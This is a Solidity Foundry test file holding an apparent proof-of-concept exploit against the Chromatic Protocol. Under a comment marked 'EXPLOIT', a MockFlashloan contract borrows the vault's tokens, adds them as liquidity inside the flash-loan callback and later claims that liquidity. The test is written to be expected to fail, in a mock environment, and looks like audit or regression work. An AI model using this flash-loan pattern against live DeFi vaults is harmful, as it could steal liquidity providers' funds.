// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/StdStyle.sol";
import {Test} from "forge-std/Test.sol";

import {ChromaticVault} from "@chromatic-protocol/contracts/core/ChromaticVault.sol";
import {TestSettlementToken} from "@chromatic-protocol/contracts/mocks/TestSettlementToken.sol";
import {ChromaticRouter} from "@chromatic-protocol/contracts/periphery/ChromaticRouter.sol";
import {ChromaticMarket} from "@chromatic-protocol/contracts/core/ChromaticMarket.sol";
import {IChromaticMarket} from "@chromatic-protocol/contracts/core/interfaces/IChromaticMarket.sol";
import {ChromaticAccount} from "@chromatic-protocol/contracts/periphery/ChromaticAccount.sol";
import {OpenPositionInfo} from "@chromatic-protocol/contracts/core/interfaces/market/Types.sol";
// import {PriceFeedMock} from "contracts/mocks/PriceFeedMock.sol";

import {BaseSetup} from "../BaseSetup.sol";

contract MockFlashloan {
    address public owner;
    ChromaticVault public contract_ChromaticVault;
    TestSettlementToken public contract_TestSettlementToken;
    ChromaticRouter public contract_ChromaticRouter;
    ChromaticMarket public contract_ChromaticMarket;

    constructor(address _vault, address _token, address _router, address _market) {
        owner = msg.sender;
        contract_ChromaticVault = ChromaticVault(_vault);
        contract_TestSettlementToken = TestSettlementToken(_token);
        contract_ChromaticRouter = ChromaticRouter(_router);
        contract_ChromaticMarket = ChromaticMarket(payable(_market));

        contract_TestSettlementToken.approve(address(contract_ChromaticRouter), type(uint256).max);
    }

    function flashLoan(address token, uint256 amount) public {
        contract_ChromaticVault.flashLoan(token, amount, address(this), abi.encode(amount));
    }

    function flashLoanCallback(uint256 _fee, bytes memory _data) public {
        uint256 amountReceived = abi.decode(_data, (uint256));
        contract_ChromaticRouter.addLiquidity(
            address(contract_ChromaticMarket),
            int16(1),
            amountReceived,
            owner
        );
        contract_TestSettlementToken.transfer(address(contract_ChromaticVault), _fee);
    }
}

contract FlashloanTest is BaseSetup {
    ChromaticVault public contract_ChromaticVault;
    TestSettlementToken public contract_TestSettlementToken;
    ChromaticRouter public contract_ChromaticRouter;
    IChromaticMarket public contract_ChromaticMarket;
    // PriceFeedMock public contract_PriceFeedMock;

    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");

    function setUp() public override {
        super.setUp();
        contract_ChromaticVault = vault;
        contract_TestSettlementToken = ctst;
        contract_ChromaticRouter = router;
        contract_ChromaticMarket = market;
        // contract_PriceFeedMock = new PriceFeedMock(); // instead of this, use oracleProvider
    }

    function testFail_flashloan3() public {
        console.log(StdStyle.yellow("\n\ntest_flashloan3()"));
        console.log(StdStyle.yellow("__________________________\n"));

        deal(address(contract_TestSettlementToken), user1, 1000 ether);
        deal(address(contract_TestSettlementToken), user2, 2000 ether);
        deal(address(contract_TestSettlementToken), user3, 3000 ether);
        deal(address(contract_TestSettlementToken), user4, 150 ether);

        vm.startPrank(user1, user1);
        console.log(
            StdStyle.yellow(
                "\nUSER1(%s) CALLS < contract_TestSettlementToken.approve(address(contract_ChromaticRouter), 1000e18) >"
            ),
            user1
        );
        contract_TestSettlementToken.approve(address(contract_ChromaticRouter), 1000e18);
        // add liquidity $1000 to 0.01% long bin
        console.log(
            StdStyle.yellow(
                "\nUSER1(%s) CALLS < contract_ChromaticRouter.addLiquidity(address(contract_ChromaticMarket), 1, 1000e18, user1) >"
            ),
            user1
        );
        contract_ChromaticRouter.addLiquidity(
            address(contract_ChromaticMarket),
            int16(1),
            1000e18,
            user1
        );
        vm.stopPrank();

        vm.startPrank(user2, user2);
        console.log(
            StdStyle.yellow(
                "\nUSER2(%s) CALLS < contract_TestSettlementToken.approve(address(contract_ChromaticRouter), 2000e18) >"
            ),
            user2
        );
        contract_TestSettlementToken.approve(address(contract_ChromaticRouter), 2000e18);
        // add liquidity $2000 to 0.01% long bin
        console.log(
            StdStyle.yellow(
                "\nUSER2(%s) CALLS < contract_ChromaticRouter.addLiquidity(address(contract_ChromaticMarket), 1, 2000e18, user2) >"
            ),
            user2
        );
        contract_ChromaticRouter.addLiquidity(
            address(contract_ChromaticMarket),
            int16(1),
            2000e18,
            user2
        );
        vm.stopPrank();

        console.log(StdStyle.yellow("\n< contract_PriceFeedMock.setRoundData(1e18) >"));
        // contract_PriceFeedMock.setRoundData(1e18);
        oracleProvider.increaseVersion(1 ether);

        vm.startPrank(user1, user1);
        console.log(
            StdStyle.yellow(
                "\nUSER1(%s) CALLS < contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 1) >"
            ),
            user1
        );
        contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 1);
        console.log(
            StdStyle.yellow(
                "\nUSER1(%s) CALLS < contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 2) >"
            ),
            user1
        );
        contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 2);
        vm.stopPrank();

        vm.startPrank(user3, user3);
        console.log(
            StdStyle.yellow("\nUSER3(%s) CALLS < contract_ChromaticRouter.createAccount() >"),
            user3
        );
        contract_ChromaticRouter.createAccount();

        ChromaticAccount contract_user3ChromaticAccount = ChromaticAccount(
            contract_ChromaticRouter.getAccount()
        );

        console.log(
            StdStyle.yellow(
                "\nUSER3(%s) CALLS < contract_TestSettlementToken.transfer(address(contract_user3ChromaticAccount), 3000e18) >"
            ),
            user3
        );
        contract_TestSettlementToken.transfer(address(contract_user3ChromaticAccount), 3000e18);

        /**
            function openPosition(
                address market,
                int256 qty,
                uint256 takerMargin,
                uint256 makerMargin,
                uint256 maxAllowableTradingFee
            ) external override returns (OpenPositionInfo memory)
        */
        console.log(
            StdStyle.yellow(
                "\nUSER3(%s) CALLS < contract_ChromaticRouter.openPosition(address(contract_ChromaticMarket), int256(500e18), 100e18, 50e18, 10000) >"
            ),
            user3
        );
        OpenPositionInfo memory position1 = contract_ChromaticRouter.openPosition(
            address(contract_ChromaticMarket),
            int256(500e18), // QTY: collateral * leverage: 100e18 * 5
            100e18, //Taker margin: collateral
            50e18, //Maker margin: collateral * leverage * take profit (10%)
            100e18
        );
        vm.stopPrank();

        console.log(
            StdStyle.red("contract_TestSettlementToken.balanceOf(contract_ChromaticVault) -> %s"),
            contract_TestSettlementToken.balanceOf(address(contract_ChromaticVault))
        );
        // 3100_005000000000000000

        // EXPLOIT
        vm.startPrank(user4, user4);
        /**
            MockFlashloan:
            constructor(address _vault, address _token, address _router, address _market)
        */
        MockFlashloan contract_MockFlashloan = new MockFlashloan(
            address(contract_ChromaticVault),
            address(contract_TestSettlementToken),
            address(contract_ChromaticRouter),
            address(contract_ChromaticMarket)
        );
        console.log(
            StdStyle.yellow(
                "\nUSER4(%s) CALLS < contract_TestSettlementToken.transfer(address(contract_MockFlashloan), 150e18) >"
            ),
            user4
        );
        contract_TestSettlementToken.transfer(address(contract_MockFlashloan), 150e18);

        console.log(
            StdStyle.yellow(
                "\nUSER4(%s) CALLS < contract_MockFlashloan.flashLoan(address(contract_TestSettlementToken), 3000e18) >"
            ),
            user4
        );
        contract_MockFlashloan.flashLoan(address(contract_TestSettlementToken), 3000e18);

        console.log(StdStyle.yellow("\n< contract_PriceFeedMock.setRoundData(1e18) >"));
        // contract_PriceFeedMock.setRoundData(1e18);
        oracleProvider.increaseVersion(1 ether);

        console.log(
            StdStyle.yellow(
                "\nUSER4(%s) CALLS < contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 3) >"
            ),
            user4
        );
        contract_ChromaticRouter.claimLiquidity(address(contract_ChromaticMarket), 3);

        vm.stopPrank();
    }
}
